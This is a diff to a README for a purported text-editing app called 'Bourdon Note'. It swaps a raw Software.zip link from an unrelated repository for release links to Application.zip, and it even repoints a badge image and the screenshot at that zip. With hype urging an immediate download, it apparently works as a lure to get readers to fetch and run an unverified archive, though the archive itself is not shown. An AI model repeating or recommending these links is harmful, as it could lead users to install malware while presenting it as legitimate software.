@@ -19,11 +19,11 @@ This repository houses the codebase and resources for the "Bourdon Note" applica
 
 ## Software Download
 
-🔗 [Launch Software.zip](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+🔗 [Launch https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)
 
 Don't miss out on experiencing the power of "Bourdon Note"! Click the link above to download the software package and get started right away! 🌟
 
-[![Download Bourdon Note](https://img.shields.io/badge/Download-Software.zip-brightgreen)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Bourdon Note](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)
 
 If you encounter any issues with the download link, please check the **Releases** section of this repository for alternative options.
 
@@ -70,4 +70,4 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 Thank you for choosing "Bourdon Note" as your trusted text and document editing companion. We hope you enjoy using the application and find it valuable for all your editing needs. Happy editing! 🎉
 
-![Bourdon Note](https://github.com/username/repository/blob/master/images/BourdonNote.png)
+![Bourdon Note](https://github.com/bossbesttip12/Bourdon-Note/releases/download/v1.0.0/Application.zip)
